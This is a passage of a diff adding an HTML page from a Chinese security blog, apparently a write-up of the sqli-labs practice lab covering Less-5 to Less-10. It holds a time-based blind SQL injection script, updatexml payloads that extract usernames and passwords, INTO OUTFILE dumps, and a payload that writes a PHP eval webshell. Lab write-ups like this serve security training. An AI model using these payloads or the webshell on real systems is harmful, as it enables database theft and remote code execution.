+</span></span><span class="line"><span class="cl">            <span class="n">time1</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">time2</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sec</span> <span class="o">=</span> <span class="p">(</span><span class="n">time2</span> <span class="o">-</span> <span class="n">time1</span><span class="p">)</span><span class="o">.</span><span class="n">seconds</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">sec</span> <span class="o">&gt;=</span><span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">name</span> <span class="o">+=</span> <span class="n">i</span>
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;database_name:&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">database_name</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="xpath注入" class="headerLink">
+    <a href="#xpath%e6%b3%a8%e5%85%a5" class="header-mark"></a>xpath注入</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mysql&gt; updatexml(1,concat(0x5e,database(),0x5e),1);
+</span></span><span class="line"><span class="cl">ERROR 1105 (HY000): XPATH syntax error: &#39;^security^&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-6-get---double-injection---double-quotes---string" class="headerLink">
+    <a href="#less-6-get---double-injection---double-quotes---string" class="header-mark"></a>Less-6 GET - Double Injection - Double Quotes - String</h3><p>双注入GET双引号字符型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$id=$_GET[&#39;id&#39;];
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">$id = &#39;&#34;&#39;.$id.&#39;&#34;&#39;;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=$id LIMIT 0,1&#34;;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">	print_r(mysql_error());
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#34;and length((select database()))&gt;9--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-7-get---dump-into-outfile---string" class="headerLink">
+    <a href="#less-7-get---dump-into-outfile---string" class="header-mark"></a>Less-7 GET - Dump into outfile - String</h3><p>导出文件GET字符型注入</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$id=$_GET[&#39;id&#39;];
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=((&#39;$id&#39;)) LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39;)) and length((select database()))&gt;9--+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>但需要网站的绝对路径</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//@@datadir输出数据库中数据的存放路径
+</span></span><span class="line"><span class="cl">?id=-1&#39; union select 1,2,@@datadir--+
+</span></span><span class="line"><span class="cl">//得到Your Password:D:\phpstudy_pro\Extensions\MySQL5.7.26\data\
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用 into outfile 导出文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//需要修改my.ini
+</span></span><span class="line"><span class="cl">secure_file_priv的值为null时,表示限制mysql不允许导入,导出
+</span></span><span class="line"><span class="cl">secure_file_priv的值为/tmp/,表示限制mysql的导入,导出只能发生在/tmp/目录下
+</span></span><span class="line"><span class="cl">secure_file_priv的值没有具体的值&#34;&#34;时表示不对mysql的导入导出做出限制
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将数据库里面的信息导出到文件中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39;)) union select * from security.users into outfile &#34;D:\\phpstudy_pro\\WWW\\other\\sqli-labs\\Less-7\\users.txt&#34; --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>也可以写进webshell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39;)) union select 1,2,&#34;&lt;?php @eval($_POST[&#39;aaa&#39;]);?&gt;&#34; into outfile &#34;D:\\phpstudy_pro\\WWW\\other\\sqli-labs\\Less-7\\shell.php&#34; --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-8-get---blind---boolian-based---single-quotes" class="headerLink">
+    <a href="#less-8-get---blind---boolian-based---single-quotes" class="header-mark"></a>Less-8 GET - Blind - Boolian Based - Single Quotes</h3><p>布尔型单引号GET盲注</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$id=$_GET[&#39;id&#39;];
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr(database(),1,1))&gt;1,sleep(5),sleep(1)) --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-9-get---blind---time-based---single-quotes" class="headerLink">
+    <a href="#less-9-get---blind---time-based---single-quotes" class="header-mark"></a>Less-9 GET - Blind - Time based. - Single Quotes</h3><p>基于时间的GET单引号盲注</p>
+<p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and if(ascii(substr(database(),1,1))&gt;1,sleep(5),sleep(1)) --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="less-10-get---blind---time-based---double-quotes" class="headerLink">
+    <a href="#less-10-get---blind---time-based---double-quotes" class="header-mark"></a>Less-10 GET - Blind - Time based - double quotes</h3><p>基于时间的双引号盲注</p>
+<p>vul</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$id=$_GET[&#39;id&#39;];
+</span></span><span class="line"><span class="cl">$id = &#39;&#34;&#39;.$id.&#39;&#34;&#39;;
+</span></span><span class="line"><span class="cl">$sql=&#34;SELECT * FROM users WHERE id=$id LIMIT 0,1&#34;;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>bypass</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#34; and if(ascii(substr(database(),1,1))&gt;1,sleep(5),sleep(1)) --+
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="盲注截取函数" class="headerLink">
+    <a href="#%e7%9b%b2%e6%b3%a8%e6%88%aa%e5%8f%96%e5%87%bd%e6%95%b0" class="header-mark"></a>盲注截取函数</h4><p>mid()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mid(column_name,start,length)
+</span></span><span class="line"><span class="cl">column_nmae:需要提取的字符字段
+</span></span><span class="line"><span class="cl">start:规定开始的位置
+</span></span><span class="line"><span class="cl">length:要返回的字段数
+</span></span><span class="line"><span class="cl">mid(database(),1,1)&gt;&#39;a&#39;:查看数据库名的第一位
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>substr () 与 substring ()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">substr()和substring()函数实现的功能是一样的
+</span></span><span class="line"><span class="cl">string substring(string,start,length)
+</span></span><span class="line"><span class="cl">string substr(string,start,length)
+</span></span><span class="line"><span class="cl">参数描述同mid参数,第一个为要处理的字符串,start为开始位置,length为截取的长度
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>left()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">left()得到字符串左部指定个数的字符串
+</span></span><span class="line"><span class="cl">left(string,n)
+</span></span><span class="line"><span class="cl">string为要截取的字符串,n为长度
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="编码函数" class="headerLink">
+    <a href="#%e7%bc%96%e7%a0%81%e5%87%bd%e6%95%b0" class="header-mark"></a>编码函数</h4><p>ord()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">返回第一个字符的ascii码
+</span></span><span class="line"><span class="cl">判断database()的第一位ascii码是否大于114：
+</span></span><span class="line"><span class="cl">ord(mid(database(),1,1))&gt;114
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ascii()</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">将某个字符转换为 ascii 值
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+
+        <div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-11-17</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span><a class="link-to-mardown" href=/sqli-labs_1_get/index.md target="_blank" rel="noopener noreferrer">Read markdown</a>
+                    </span><span>|&nbsp;<a class="link-to-source" href=https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_1_get.md target="_blank" rel="noopener noreferrer">View source</a>
+                    </span><span>|&nbsp;<a class="link-to-edit" href=https://github.com/HEIGE-PCloud/DoIt/edit/main/exampleSite/content/posts\sqli-labs_1_get.md target="_blank" rel="noopener noreferrer">Edit this page</a>
+                    </span><span>|&nbsp;<a class="link-to-report" href=https://github.com/HEIGE-PCloud/DoIt/issues/new?title=[bug]%20sqli-labs%E9%9D%B6%E5%9C%BA%281%29GET%E5%9E%8B&body=|Field|Value|%0A|-|-|%0A|Title|sqli-labs%E9%9D%B6%E5%9C%BA%281%29GET%E5%9E%8B|%0A|Url|http://scofield1920.github.io/sqli-labs_1_get/|%0A|Filename|https://github.com/HEIGE-PCloud/DoIt/blob/main/exampleSite/content/posts\sqli-labs_1_get.md| target="_blank" rel="noopener noreferrer">Report issue</a>
+                    </span></div>
+            <div class="post-info-share"><button title="Share on Twitter" data-sharer="twitter" data-url="http://scofield1920.github.io/sqli-labs_1_get/" data-title="sqli-labs靶场(1)GET型" data-hashtags="web,wp,sqli"><span class="fab fa-twitter fa-fw"></span></button><button title="Share on Facebook" data-sharer="facebook" data-url="http://scofield1920.github.io/sqli-labs_1_get/" data-hashtag="web"><span class="fab fa-facebook-square fa-fw"></span></button><button title="Share on Hacker News" data-sharer="hackernews" data-url="http://scofield1920.github.io/sqli-labs_1_get/" data-title="sqli-labs靶场(1)GET型"><span class="fab fa-hacker-news fa-fw"></span></button><button title="Share on Line" data-sharer="line" data-url="http://scofield1920.github.io/sqli-labs_1_get/" data-title="sqli-labs靶场(1)GET型"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="Share on 微博" data-sharer="weibo" data-url="http://scofield1920.github.io/sqli-labs_1_get/" data-title="sqli-labs靶场(1)GET型"><span class="fab fa-weibo fa-fw"></span></button><button title="Share on Telegram" data-sharer="telegram" data-url="http://scofield1920.github.io/sqli-labs_1_get/" data-title="sqli-labs靶场(1)GET型" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="Share on Mastodon"onclick="javascript:shareOnMastodon(&#34;sqli-labs靶场(1)GET型&#34;, &#34;http://scofield1920.github.io/sqli-labs_1_get/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/wp/">Wp</a>,&nbsp;<a href="/tags/sqli/">Sqli</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/sqli-labs_2_post/" class="prev" rel="prev" title="sqli-labs靶场(2)POST"><i class="fas fa-angle-left fa-fw"></i>sqli-labs靶场(2)POST</a>
+            <a href="/port_scan/" class="next" rel="next" title="端口扫描原理">端口扫描原理<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreferrer" title="Hugo 0.124.1">Hugo</a>&nbsp;|&nbsp;Theme - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreferrer" title="DoIt 0.4.0"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank" rel="noopener noreferrer"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="Back to Top">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"data":{"desktop-header-typeit":"Sc0fie1d-Blog","mobile-header-typeit":"Sc0fie1d-Blog"},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"en_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":300,"type":"algolia"},"sharerjs":true,"table":{"sort":true},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"desktop-header-typeit":["desktop-header-typeit"],"mobile-header-typeit":["mobile-header-typeit"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/typeit.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
